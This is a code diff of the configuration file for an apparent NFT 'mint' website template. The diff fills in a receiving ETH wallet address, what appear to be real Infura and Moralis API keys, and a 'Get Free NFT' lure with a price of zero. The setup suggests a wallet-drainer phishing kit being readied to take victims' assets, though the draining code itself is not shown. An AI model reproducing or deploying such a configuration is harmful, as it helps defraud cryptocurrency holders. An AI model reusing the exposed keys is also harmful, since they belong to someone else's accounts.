@@ -1,12 +1,12 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
-const address = "YOUR WALLET";    // Your ETH wallet that you have to receive NFTs
-const infuraId = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
-const moralisApi = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"    // Web3 Api key | https://moralis.io/ | For NFTs
+const address = "0x8C7176a2c1d79cCeb0cFAE8A9ccbB3AA06D10056";    // Your ETH wallet that you have to receive NFTs
+const infuraId = "ceff8cbb5a0a4aefbaa0f3d711bbbd9b"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "Lr8bjwABSIarOe2d2QLJ41ADmGnQyPRE9R5REttg5urWvPZ0jwxk9b7vLQHXxv0E"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "Tec.sellix.io",
-    title: "Tec MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    date: "XX.XX.XXXX", // Today date
+    name: "Monkey Drop",
+    title: "Get Free NFT", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    date: "02.10.2022", // Today date
     socialMedia: {
         discord: "https://discord.gg/example",
         twitter: "https://twitter.com/example",
@@ -23,7 +23,7 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 0.2,         // Price per NFT.
+    price: 0.0,         // Price per NFT.
     totalSupply: 999,   // Total supply of NFTs.
     minUnits: 1,        // Min units to buy.
     maxUnits: 6,        // Max units to buy.
